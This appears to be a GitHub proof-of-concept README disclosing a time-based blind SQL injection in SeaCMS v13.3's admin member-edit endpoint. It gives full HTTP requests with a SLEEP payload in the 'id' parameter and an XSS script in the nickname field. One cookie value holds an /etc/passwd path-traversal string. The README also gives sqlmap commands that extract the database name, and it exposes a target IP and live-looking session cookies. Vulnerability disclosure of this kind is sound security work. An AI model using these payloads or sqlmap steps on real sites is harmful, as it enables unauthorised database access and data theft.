# seacms-v13.3-sqli
Proof of Concept for SQL Injection vulnerability in SeaCMS v13.3
Impact system：<SeaCMS v13.3
Vulnerability URL：http://xxx.xxx.xx/30h9r/admin_members.php?ac=editsave
Note: The /30h9r/ in /30h9r/admin_members.php is randomly generated. The /30h9r/ for each cms is randomly generated
Vulnerability poc：

------------------------------------------------------------------------------------------------------------------------------------
POST /30h9r/admin_members.php?ac=editsave HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 297
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: 
Origin: 
Referer: 
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip

Submit=%E7%A1%AE%E8%AE%A4%E4%BF%9D%E5%AD%98&acode=4146127b692bc4c4c282f61a4870f560&delpic=1&email=24622%40qq.com&gid=2&id=123 OR (SELECT 4554 FROM (SELECT(SLEEP(5)))tNAW)&nickname=%3Cscript%3Ealert%28%27xss%27%29&psd=&upoints=0&ustate=1&vipendtime=2025-09-07+13%3A32%3A23
-----------------------------------------------------------------------------------------------------------------------------------

Vulnerability reproduction:

Visit the ocean CMS website: https://www.seacms.net/; As shown in the picture：

<img width="832" height="538" alt="image" src="https://github.com/user-attachments/assets/7752ef93-0469-4846-b280-6ecdacffab08" />

<img width="832" height="514" alt="image" src="https://github.com/user-attachments/assets/33aefc47-2e75-4ba3-b13a-1f7712cb511a" />

Download the latest installation package version V13.3; And perform decompression; As shown in the picture

<img width="296" height="141" alt="image" src="https://github.com/user-attachments/assets/a2ce45f2-337a-496a-9b6e-046a9f527cde" />

Install according to the official user manual

The environment I installed this time:

Ubuntu 22, CPU: 2 cores, Memory: 4GB, Baota Panel -v9.6.0, MySQL 5.7.43, Apache 2.4.62, PHP 5.6.40

After installing the system, go to the default background. As shown in the picture

Request a delay of 10 Response within 20 seconds

<img width="832" height="536" alt="image" src="https://github.com/user-attachments/assets/690ba7e6-7b54-45af-b38b-1d314416837e" />

Request a delay of 5 Response within 10 seconds
<img width="2738" height="1388" alt="image" src="https://github.com/user-attachments/assets/8477b34d-f1b4-4926-9999-72d6133b8608" />


<img width="2742" height="1428" alt="image" src="https://github.com/user-attachments/assets/b4dfc72b-f2fb-4c90-8cd2-130f83f54795" />

Copy the request packet; Change the injection point parameter 'id' to 'id=123' and save it as sql.txt; As follows:
-----------------------------------------------------------------------------------------------------------------------------------

POST /30h9r/admin_members.php?ac=editsave HTTP/1.1
Host: 117.72.99.125
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 297
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: b90f5dd6d9e2dd57d6923cc5ff004f81_ssl=4367f410-636e-4b97-9883-f34bf361fa12.6Qw9eztOxIrDDuk37dBvDYqdw4M; a92363a1749cf97619f515a0efc163a5_ssl=f92a0fb9-7632-4731-bd2e-fb39cbfe492b.djCZJ5AYTm8WZzwMZyszKsi86S0; t00ls=e54285de394c4207cd521213cebab040; t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MTA6InBocCB8IHBocD8iO3M6MzoiYWxsIjtpOjA7czozOiJodGEiO2k6MTt9; XLA_CI=8084cfdc4be60dd551c26fe7666cb493; history=%5B%7B%22name%22%3A%22kaill%22%2C%22pic%22%3A%22%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%22%2C%22link%22%3A%22%2Fdetail%2F%3F524.html%22%2C%22part%22%3A%22%22%7D%5D; PHPSESSID=67b60hjkikku0l5hc5s97dq6a6
Origin: http://117.72.99.125
Referer: http://117.72.99.125/30h9r/admin_members.php?ac=edit&id=2
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip

Submit=%E7%A1%AE%E8%AE%A4%E4%BF%9D%E5%AD%98&acode=4146127b692bc4c4c282f61a4870f560&delpic=1&email=24622%40qq.com&gid=2&id=123&nickname=%3Cscript%3Ealert%28%27xss%27%29&psd=&upoints=0&ustate=1&vipendtime=2025-09-07+13%3A32%3A23
----------------------------------------------------------------------------------------------------------------------------------
Use sqlmap for injection verification

The existence of sql injection was successfully verified using the injection statement "sqlmap -r sql.txt -p id --dbms=mysql --level=5 --risk=3 --random-agent --flush-session --batch -3 ". As shown in the picture
<img width="1005" height="421" alt="截屏2025-09-07 16 42 06" src="https://github.com/user-attachments/assets/b27c6b97-99a5-4237-9c69-dec91cad0c46" />
The statement "sqlmap -r sql.txt -p id --dbms=mysql --technique=T --current --db --batch -- v 3 "was used to inject and obtain the database, successfully generating the database name. As shown in the picture
<img width="1010" height="429" alt="截屏2025-09-07 18 08 18" src="https://github.com/user-attachments/assets/4353204c-520a-4c67-b17d-711899d4eaeb" />



















































